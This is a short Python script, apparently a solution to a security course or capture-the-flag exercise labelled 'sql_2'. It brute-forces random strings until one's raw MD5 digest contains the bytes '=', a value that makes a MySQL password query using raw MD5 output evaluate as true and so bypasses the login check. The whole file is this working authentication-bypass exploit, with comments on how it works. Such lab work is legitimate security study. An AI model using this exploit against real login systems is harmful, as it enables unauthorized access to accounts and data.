from pymd5 import md5, padding
import random, re

# To create the password to exploit the MD5 hash function, we take advantage of the
# fact that when MySQL compares two binary inputs using the '=' expression, it always
# returns FALSE = FALSE which returns TRUE. This tricks the SQL query to think
# that the password field found a correct password and returned TRUE, but we just
# took advantage of the aformentioned binary comparison that happens.
# So we generate a random input that when hashed using MD5 contains
# the exact byte encoding of the expression '='. This then causes the MySQL to compare
# two binary inputs instead of just reading the MD5 hash as one input. 

# Note: This program can take some time to create the password input, so don't
# be surprised when it takes more than a couple of seconds to execute.

while(True):
    sql_input = ""
    # Some arbitrarily high max number
    max_int = 20000000000
    # Loop a couple of times to create a random string
    # as the password SQL input
    for i in range(0,5):
        sql_input += str(random.randint(0, max_int))
    # Use Python Regular Expressions to find the exact byte encoding
    # of '=' within the MD5 digested version of the random string we just created
    match = re.search(rb"'='", md5(sql_input).digest())
    # When we find it, return the password SQL input we generated
    if match:
        print("Password input for sql_2:", sql_input)
        break